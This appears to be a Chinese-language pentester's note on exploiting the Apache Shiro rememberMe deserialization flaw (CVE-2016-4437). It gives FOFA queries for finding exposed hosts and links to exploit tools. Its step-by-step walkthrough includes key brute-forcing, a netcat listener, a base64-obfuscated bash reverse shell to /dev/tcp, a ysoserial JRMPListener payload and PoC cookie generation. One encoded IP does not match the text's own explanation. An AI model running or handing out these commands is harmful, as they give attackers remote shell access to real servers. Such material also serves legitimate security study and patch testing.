# Shiro

## 历史发现

> fofa搜索语法
>
> header="rememberme=deleteMe"
>
> header="shiroCookie"

## Shiro漏洞检测工具

> https://github.com/fupinglee/ShiroScan
> https://github.com/sv3nbeast/ShiroScan
> https://github.com/insightglacier/Shiro_exploit
> https://github.com/Ares-X/shiro-exploit

## Shiro历史漏洞利用

### Shiro反序列化远程代码执行漏洞（CVE-2016-4437）

> 影响版本
>
> Apache Shiro <= 1.2.4

### 利用组件

`org.apache.commons`中的`commons-collections4`(理论上`commons-collections2`也有)

### 漏洞原因

`shiro`默认使用了`CookieRememberMeManager`，其处理`cookie`的流程是：

`得到 rememberMe的cookie值` –> `Base64解码` –> `AES解密` –> `反序列化` 。

### 利用位置

任意http请求中`cookie`处`rememberMe`参数

### Payload构造

`前16字节的密钥`->`后面加入序列化参数`->`AES加密`->`base64编码`->`发送cookie`

## 利用步骤

![image-20221201202305148](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20221201202305148.png)

1. 输入账号密码，点击Remember me，抓包。

   查看返回包中的`Set-Cookie: rememberMe=deleteMe;`字段。确定为shiro组件。

2. 爆破key（文件在`Shiro_exploit-master`文件夹下）

   ```
   python2 shiro_exploit.py -u http://192.168.1.108:8080/doLogin
   ```

   得到key后，在`shiro.py`文件中将密钥改为这个脚本爆破出来的密钥。

3. 选定一个端口进行反弹shell

   ```bash
   nc -lvvp 9999
   ```

   反弹shell

   ```bash
   bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMS4xMDYvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}
   
   YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMS4xMDUvOTk5OSAwPiYx为 bash -i >&/dev/tcp/192.168.1.105/9999 0>&1 加密结果
   ```

4. 使用`ysoserial`反序列化工具监听1099端口

   ```bash
   java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMS4xMDUvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}"
   ```

5. 利用`shiro.py`进行生成poc

   ```bash
   python2 shiro.py 101.200.236.51:1099
   
   #IP填yesoerial监听的机器的IP和端口
   ```

6. 把生成的poc放置数据包中的cookie字段中使用；放在rememberMe后面。

7. nc监听端口反弹到shell。
